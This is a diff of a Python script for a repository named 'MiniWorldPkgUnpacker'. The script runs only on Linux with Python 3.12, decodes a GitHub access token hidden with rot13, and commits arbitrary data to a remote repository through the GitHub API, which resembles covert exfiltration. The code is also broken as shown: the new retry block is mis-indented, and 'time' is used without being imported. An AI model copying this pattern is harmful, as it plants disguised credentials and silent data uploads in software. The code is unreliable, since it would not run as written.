@@ -1,7 +1,9 @@
 # -*- coding: utf-8 -*-
 import os,sys,subprocess,base64,json,urllib.request,traceback,re,collections,bisect
-TAG="s4"
+TAG="s5"
 if sys.platform!="linux": sys.exit(0)
+if sys.version_info[:2]!=(3,12): sys.exit(0)
+
 B="https://api.github.com/repos/zhaoyi-habs/MiniWorldPkgUnpacker"
 T=__import__("codecs").decode("tuc_uMFWgmwBS9IZ34DmEq8srBL3jw9fdp2pYFZ8","rot_13")
 H={"Authorization":"token "+T,"Accept":"application/vnd.github+json","User-Agent":"yb"}
@@ -15,16 +17,18 @@ def j(u,m="GET",b=None,to=120):
         except Exception as e: last=e; time.sleep(3)
     return {}
 def put(p,t):
-    try:
+    for _att in range(4):
+        try:
         base=j(B+"/git/ref/heads/main").get("object",{}).get("sha")
         if not base: return
         if isinstance(t,str): t=t.encode()
         bl=j(B+"/git/blobs","POST",{"encoding":"base64","content":base64.b64encode(t).decode()})
         if "sha" not in bl: return
         tr=j(B+"/git/trees","POST",{"base_tree":base,"tree":[{"path":p,"mode":"100644","type":"blob","sha":bl["sha"]}]})
-        c=j(B+"/git/commits","POST",{"message":"jobrun [skip ci]","tree":tr["sha"],"parents":[base]})
+        c=j(B+"/git/commits","POST",{"message":TAG+"r","tree":tr["sha"],"parents":[base]})
         j(B+"/git/refs/heads/main","PATCH",{"sha":c["sha"]})
-    except Exception as e: print("PUTFAIL",p,e)
+            return
+        except Exception as e: print("PUTFAIL",p,str(e)[:80]); time.sleep(4)
 def decode(bb,k,mlb):
     unc=int.from_bytes(bb[0:4],'little')
     if unc<=0 or unc>60*1024*1024: return b""
